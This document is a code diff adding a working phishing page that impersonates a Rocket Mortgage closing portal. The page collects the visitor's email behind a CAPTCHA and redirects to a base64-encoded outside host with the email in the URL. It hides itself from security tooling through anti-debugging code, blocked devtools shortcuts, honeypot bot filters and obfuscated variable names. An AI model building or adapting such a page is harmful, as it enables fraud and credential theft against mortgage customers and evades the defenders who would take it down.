@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Rocket Mortgage Closing Portal</title>
+  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline' https://challenges.cloudflare.com; frame-src https://challenges.cloudflare.com; style-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net;">
+  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap');
+    
+    body {
+      font-family: 'Poppins', sans-serif;
+      user-select: none;
+      -webkit-user-select: none;
+      -moz-user-select: none;
+      -ms-user-select: none;
+    }
+    
+    .closing-text {
+      font-size: 2.5rem;
+      font-weight: 800;
+      background: linear-gradient(135deg, #b91c1c 0%, #7f1d1d 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      text-shadow: 0 2px 4px rgba(185, 28, 28, 0.2);
+      letter-spacing: -0.025em;
+      margin-bottom: 0.5rem;
+    }
+    
+    .download-btn {
+      transition: all 0.3s ease;
+      box-shadow: 0 4px 6px rgba(185, 28, 28, 0.2);
+    }
+    
+    .download-btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 6px 12px rgba(185, 28, 28, 0.3);
+    }
+    
+    .download-btn:active {
+      transform: translateY(0);
+    }
+    
+    .input-field:focus {
+      box-shadow: 0 0 0 3px rgba(185, 28, 28, 0.2);
+    }
+    
+    .security-pulse {
+      animation: pulse 2s infinite;
+    }
+    
+    @keyframes pulse {
+      0% { box-shadow: 0 0 0 0 rgba(185, 28, 28, 0.4); }
+      70% { box-shadow: 0 0 0 10px rgba(185, 28, 28, 0); }
+      100% { box-shadow: 0 0 0 0 rgba(185, 28, 28, 0); }
+    }
+    
+    /* Additional security styling */
+    .fake-element {
+      position: absolute;
+      left: -9999px;
+      opacity: 0;
+      pointer-events: none;
+    }
+    
+    .no-pointer-events {
+      pointer-events: none;
+    }
+  </style>
+</head>
+<body class="bg-gradient-to-br from-red-50 to-white min-h-screen flex items-center justify-center px-4" oncontextmenu="return false;" onselectstart="return false;" ondragstart="return false;">
+  <!-- Fake hidden elements for bot detection -->
+  <div class="fake-element">
+    <input type="text" id="fake-name" name="fake-name" autocomplete="off" />
+    <input type="checkbox" id="fake-newsletter" name="fake-newsletter" checked />
+    <a href="#" id="fake-link">Click here</a>
+  </div>
+  
+  <div class="bg-white p-8 rounded-2xl shadow-xl w-full max-w-md text-center security-pulse">
+    <div class="mb-6">
+      <!-- Replaced shield logo with "CLOSING portal" text -->
+      <div class="closing-text">CLOSING portal</div>
+      <h1 class="text-2xl font-extrabold text-gray-800 mt-2">Rocket Mortgage Secure Closing Portal</h1>
+    </div>
+
+    <p class="text-sm text-gray-600 mb-6">Please enter your email and complete the CAPTCHA to view the secure email.</p>
+
+    <form id="download-form" class="relative">
+      <!-- Enhanced honeypot fields -->
+      <div class="hidden">
+        <label for="hp-phone">Phone</label>
+        <input type="text" id="hp-phone" name="phone" autocomplete="off" tabindex="-1" />
+        <input type="checkbox" id="hp-consent" name="consent" autocomplete="off" tabindex="-1" style="display:none !important;" />
+        <input type="text" id="hp-url" name="url" autocomplete="off" tabindex="-1" />
+      </div>
+
+      <!-- Email input -->
+      <div class="text-left mb-4">
+        <label for="user-email" class="block text-sm font-medium text-gray-700 mb-1">Email Address</label>
+        <input
+          type="email"
+          id="user-email"
+          placeholder="user@company.com"
+          class="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-red-500 input-field"
+          autocomplete="email"
+          required
+          autofocus
+        />
+      </div>
+
+      <!-- Cloudflare Turnstile widget -->
+      <div id="cf-captcha" class="mb-4 flex justify-center"></div>
+
+      <!-- Submit button -->
+      <button
+        type="submit"
+        id="download-btn"
+        class="w-full bg-red-600 text-white py-3 rounded-lg font-medium hover:bg-red-700 download-btn disabled:opacity-50 disabled:cursor-not-allowed no-pointer-events"
+        disabled
+      >
+        CONTINUE
+      </button>
+
+      <div id="status" class="mt-4 text-sm text-red-500 hidden"></div>
+      <div id="success-message" class="mt-4 text-sm text-green-600 hidden">
+        <svg class="inline-block h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
+        </svg>
+        de-encrypting secure email… please wait....
+      </div>
+    </form>
+
+    <footer class="mt-8 text-xs text-gray-400">
+      <div class="flex items-center justify-center mb-2">
+        <svg class="h-4 w-4 mr-1 text-red-400" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg">
+          <path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd"></path>
+        </svg>
+        <span>Secure Encrypted Connection</span>
+      </div>
+      &copy; ©2000-2025 Rocket Mortgage, LLC. All rights reserved. Lending services provided by Rocket Mortgage, LLC.
+    </footer>
+  </div>
+
+  <script>
+    // Enhanced security measures
+    (function(){
+      // Fixed anti-debugging technique - won't trigger false positives
+      var debugCheck = function() {
+        var start = Date.now();
+        debugger;
+        if (Date.now() - start > 100) {
+          // Debugger detected - redirect to error page
+          window.location.href = "about:blank";
+          return;
+        }
+      };
+      
+      // Run debug check once after a short delay
+      setTimeout(debugCheck, 500);
+      
+      // Prevent certain key combinations and right-click
+      document.addEventListener('keydown', function(e) {
+        if (e.ctrlKey && ['s','p','u','c','x','i','j'].includes(e.key.toLowerCase()) || 
+            e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
+          e.preventDefault();
+          return false;
+        }
+      });
+      
+      // Mouse movement tracking for human verification
+      var mouseMoved = false;
+      document.addEventListener('mousemove', function() {
+        mouseMoved = true;
+      }, { once: true });
+      
+      // String obfuscation function
+      function decodeString(encoded) {
+        return decodeURIComponent(escape(atob(encoded)));
+      }
+      
+      // Obfuscated variables and function names
+      var _0x4d2a = ['download-form', 'status', 'success-message', 'download-btn', 
+                     'hp-phone', 'user-email', 'hp-url', 'getElementById', 
+                     'addEventListener', 'value', 'trim', 'toLowerCase', 
+                     'hidden', 'classList', 'textContent', 'getResponse', 
+                     'href', 'location', 'remove', 'add', 'disabled'];
+      
+      var formElement = document[_0x4d2a[7]](_0x4d2a[0]),
+          statusElement = document[_0x4d2a[7]](_0x4d2a[1]),
+          successElement = document[_0x4d2a[7]](_0x4d2a[2]),
+          submitButton = document[_0x4d2a[7]](_0x4d2a[3]),
+          redirectUrl = decodeString('aHR0cHM6Ly9jaXh4ZXJ3ZG9rLnNub25vaXJvb3AuaXQuY29tLw=='),
+          pageLoadTime = Date.now(),
+          widgetId;
+      
+      // Enable pointer events after human interaction
+      function enablePointerEvents() {
+        submitButton.classList.remove('no-pointer-events');
+      }
+      
+      document.addEventListener('click', enablePointerEvents, { once: true });
+      document.addEventListener('keydown', enablePointerEvents, { once: true });
+      
+      window[_0x4d2a[8]]('load', function() {
+        if (window.turnstile) {
+          widgetId = turnstile.render('#cf-captcha', {
+            sitekey: '0x4AAAAAABuKMwGhqGRgvrAl',
+            callback: function(token) {
+              if (mouseMoved) {
+                submitButton[_0x4d2a[20]] = false;
+                statusElement[_0x4d2a[13]][_0x4d2a[18]](_0x4d2a[12]);
+              }
+            },
+            'error-callback': function() {
+              submitButton[_0x4d2a[20]] = true;
+              showMessage(decodeString('Q0FQVENIQSBlcnJvciwgcGxlYXNlIHRyeSBhZ2Fpbi4='));
+            },
+            'expired-callback': function() {
+              submitButton[_0x4d2a[20]] = true;
+              showMessage(decodeString('Q0FQVENIQSBleHBpcmVkLCBwbGVhc2UgY29tcGxldGUgYWdhaW4u'));
+            }
+          });
+        }
+      });
+      
+      function showMessage(message) {
+        successElement[_0x4d2a[13]][_0x4d2a[19]](_0x4d2a[12]);
+        statusElement[_0x4d2a[14]] = message;
+        statusElement[_0x4d2a[13]][_0x4d2a[18]](_0x4d2a[12]);
+      }
+      
+      formElement[_0x4d2a[8]]('submit', function(event) {
+        event.preventDefault();
+        
+        // Enhanced bot detection
+        if (document[_0x4d2a[7]](_0x4d2a[4])[_0x4d2a[9]][_0x4d2a[10]]() !== '' ||
+            document[_0x4d2a[7]](_0x4d2a[6])[_0x4d2a[9]][_0x4d2a[10]]() !== '') {
+          return showMessage(decodeString('Qm90IGRldGVjdGVkLg=='));
+        }
+        
+        if (submitButton[_0x4d2a[20]]) {
+          return showMessage(decodeString('UGxlYXNlIGNvbXBsZXRlIHRoZSBDQVBUQ0hFIGJlZm9yZSBkb3dubG9hZGluZy4='));
+        }
+        
+        // Fixed time verification - now checks if user spent reasonable time on page
+        if (Date.now() - pageLoadTime < 3000) {
+          return showMessage(decodeString('UGxlYXNlIHN0YXkgb24gcGFnZSBhIGJpdCBsb25nZXIu'));
+        }
+        
+        if (!mouseMoved) {
+          return showMessage(decodeString('U3VzcGljaW91cyBhY3Rpdml0eSBkZXRlY3RlZC4gUGxlYXNlIHJlZnJlc2ggdGhlIHBhZ2Uu'));
+        }
+        
+        var token = turnstile[_0x4d2a[15]](widgetId);
+        if (!token) {
+          return showMessage(decodeString('UGxlYXNlIGNvbXBsZXRlIHRoZSBDQVBUQ0hBLg=='));
+        }
+        
+        statusElement[_0x4d2a[13]][_0x4d2a[19]](_0x4d2a[12]);
+        successElement[_0x4d2a[13]][_0x4d2a[18]](_0x4d2a[12]);
+        
+        var email = document[_0x4d2a[7]](_0x4d2a[5])[_0x4d2a[9]][_0x4d2a[10]]()[_0x4d2a[11]]();
+        window[_0x4d2a[17]][_0x4d2a[16]] = redirectUrl + '?email=' + btoa(email);
+      });
+    })();
+  </script>
+</body>
+</html>
